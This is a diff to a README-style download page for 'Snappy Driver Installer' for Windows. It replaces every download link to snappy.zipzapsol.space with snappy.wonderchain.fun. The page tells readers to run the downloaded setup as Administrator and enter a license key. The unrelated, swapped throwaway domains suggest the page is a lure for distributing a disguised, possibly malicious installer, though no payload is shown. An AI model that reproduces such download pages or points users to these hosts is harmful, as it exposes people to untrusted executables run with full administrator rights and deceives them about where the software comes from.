@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Snappy Driver Installer** for Windows.
 
 <p align="center">
-  <a href="https://snappy.zipzapsol.space/">
+  <a href="https://snappy.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-Snappy%20Driver%20Installer-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Snappy Driver Installer">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[snappy.zipzapsol.space](https://snappy.zipzapsol.space/)** |
-| **Full URL** | `https://snappy.zipzapsol.space/` |
+| **Direct link** | **[snappy.wonderchain.fun](https://snappy.wonderchain.fun/)** |
+| **Full URL** | `https://snappy.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — snappy.zipzapsol.space](https://snappy.zipzapsol.space/)** (link above)
+1. Click **[Download — snappy.wonderchain.fun](https://snappy.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://snappy.zipzapsol.space/"><strong>⬇ Download Snappy Driver Installer now</strong></a></p>
+<p align="center"><a href="https://snappy.wonderchain.fun/"><strong>⬇ Download Snappy Driver Installer now</strong></a></p>
 
 ---
 
